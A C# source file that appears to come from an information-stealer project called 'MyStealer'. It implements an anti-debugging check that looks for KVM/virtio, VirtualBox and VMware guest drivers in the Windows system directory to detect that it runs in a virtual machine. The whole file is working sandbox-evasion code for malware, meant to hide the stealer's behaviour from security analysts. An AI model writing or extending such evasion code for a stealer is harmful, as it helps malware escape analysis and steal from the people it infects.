using System;
using System.IO;


namespace MyStealer.AntiDebug.Check
{
    internal class Drivers : CheckBase
    {
        public override string Name => "Drivers";

        private readonly string[] driverNames = new string[]
        {
            "netkvm.sys", // NetKVM

            "balloon.sys", // virtio-win
            "vioinput.sys", //virtio-win
            "viofs.sys", // virtio-win
            "vioser.sys", // virtio-win

            "vboxmouse.sys", // VirtualBox
            "vboxguest.sys", // VirtualBox
            "vboxsf.sys", // VirtualBox
            "vboxvideo.sys", // VirtualBox
            "vboxogl.dll", // VirtualBox

            "vmmouse.sys", // vmware
        };

        public override bool CheckPassive()
        {
            foreach (var name in driverNames)
            {
                if (File.Exists(Path.Combine(Environment.SystemDirectory, name)) || File.Exists(Path.Combine(Environment.SystemDirectory, "drivers", name)))
                {
                    Logger.Information("Bad driver {name} found.", name);
                    return true;
                }
            }

            return false;
        }
    }
}
